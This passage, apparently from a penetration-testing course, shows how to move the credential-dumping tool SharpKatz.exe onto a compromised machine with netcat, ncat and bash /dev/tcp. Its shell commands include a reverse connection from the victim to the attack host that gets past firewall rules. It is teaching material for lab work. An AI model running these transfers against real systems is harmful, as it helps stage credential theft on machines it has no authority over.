The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.

In this example, we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.

We'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)) using a single greater-than `>` followed by the filename, `SharpKatz.exe`.

#### NetCat - Compromised Machine - Listening on Port 8000

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```
If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.

#### Ncat - Compromised Machine - Listening on Port 8000


```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

#### Netcat - Attack Host - Sending File to Compromised machine

  Miscellaneous File Transfer Methods

```shell-session
pepedavidphone@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
pepedavidphone@htb[/htb]$ # Example using Original Netcat
pepedavidphone@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.

#### Ncat - Attack Host - Sending File to Compromised machine

 

```shell-session
pepedavidphone@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
pepedavidphone@htb[/htb]$ # Example using Ncat
pepedavidphone@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.

#### Attack Host - Sending File as Input to Netcat 

```shell-session
pepedavidphone@htb[/htb]$ # Example using Original Netcat
pepedavidphone@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine Connect to Netcat to Receive the File


```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Let's do the same with Ncat:

#### Attack Host - Sending File as Input to Ncat

```shell-session
pepedavidphone@htb[/htb]$ # Example using Ncat
pepedavidphone@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

#### NetCat - Sending File as Input to Netcat

```shell-session
pepedavidphone@htb[/htb]$ # Example using Original Netcat
pepedavidphone@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Sending File as Input to Ncat

```shell-session
pepedavidphone@htb[/htb]$ # Example using Ncat
pepedavidphone@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```